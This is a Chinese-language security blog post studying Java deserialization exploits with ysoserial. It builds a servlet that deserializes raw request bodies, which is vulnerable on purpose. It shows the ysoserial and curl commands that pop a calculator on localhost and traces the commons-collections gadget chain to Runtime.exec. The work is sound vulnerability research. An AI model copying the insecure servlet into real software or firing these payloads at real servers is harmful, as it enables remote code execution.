---
title: ysoserial反序列化研究
date: 2017-05-20 00:01:03
categories: Web安全
tags:
    - 反序列化
    - JAVA
---

## demo环境搭建

源码分析ysoserial, 了解java反序列化利用的常见方式，光说不练假把式，搭建demo环境，测试ysoserial利用的实际效果。

**开发环境**

* InteliJ IDEA
* JDK 1.8.0_112-b16
* tomcat 8.5
* MAC OS

新建项目"SimpleWebDemo",再新建servlet文件"SimpleServlet",项目配置如下图:

{% asset_img 001.png %}

<!-- more -->

`SimpleServlet`源码如下:

```java
package demo;

import javax.servlet.ServletInputStream;
import java.io.*;

/**
 * Created by js on 2017/5/19.
 */
public class SimpleServlet extends javax.servlet.http.HttpServlet {
    protected void doPost(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException {
        ServletInputStream sis = request.getInputStream();

        ObjectInputStream ois = new ObjectInputStream(sis);
        try {
            ois.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        ois.close();
    }

    protected void doGet(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException {
        PrintWriter out = response.getWriter();
        out.println("This is a demo");
    }
}
```

利用ysoserial生成payload:

```
java -jar ysoserial-v0.0.4.jar CommonsCollections5 "open -a Calculator" > calc.payload
```

curl访问触发漏洞:

```
curl "http://127.0.0.1:8080/demo" --data-binary "@./calc.payload"
```

{% asset_img 002.png %}

## ysoserial反序列化利用

查看反序列化用到的组件及所需满足的条件: `java -jar ysoserial-v0.0.4.jar`

```
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
	Available payload types:
		BeanShell1 [org.beanshell:bsh:2.0b5]
		C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]
		CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
		CommonsCollections1 [commons-collections:commons-collections:3.1]
		CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections3 [commons-collections:commons-collections:3.1]
		CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
		CommonsCollections5 [commons-collections:commons-collections:3.1]
		CommonsCollections6 [commons-collections:commons-collections:3.1]
		FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4]
		Groovy1 [org.codehaus.groovy:groovy:2.3.9]
		Hibernate1 []
		Hibernate2 []
		JBossInterceptors1 [javassist:javassist:3.12.1.GA, org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
		JRMPClient []
		JRMPListener []
        JSON1 [net.sf.json-lib:json-lib:jar:jdk15:2.4, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2, commons-lang:commons-lang:2.6, net.sf.ezmorph:ezmorph:1.0.6, commons-beanutils:commons-beanutils:1.9.2, org.springframework:spring-core:4.1.4.RELEASE, commons-collections:commons-collections:3.1]
		JavassistWeld1 [javassist:javassist:3.12.1.GA, org.jboss.weld:weld-core:1.1.33.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21]
		Jdk7u21 []
		Jython1 [org.python:jython-standalone:2.5.2]
		MozillaRhino1 [rhino:js:1.7R2]
		Myfaces1 []
		Myfaces2 []
		ROME [rome:rome:1.0]
		Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
		Spring2 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2]
		URLDNS []
		Wicket1 [wicket-util:wicket-util:6.23]
```

可以看出ysoyerial支持多种组件，而最常见的就是`commons-collections`组件了。因此有必要分析ysoserial利用`commons-collections`组件构造反序列化POP链的原理。

## commons-collections

### commons-collections1

**依赖条件**

* commons-collections:3.1

**调用链**

```
Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()    <== 触发调用 transform()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()				
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

http://gursevkalra.blogspot.cz/2016/01/ysoserial-commonscollections1-exploit.html
https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html

http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/
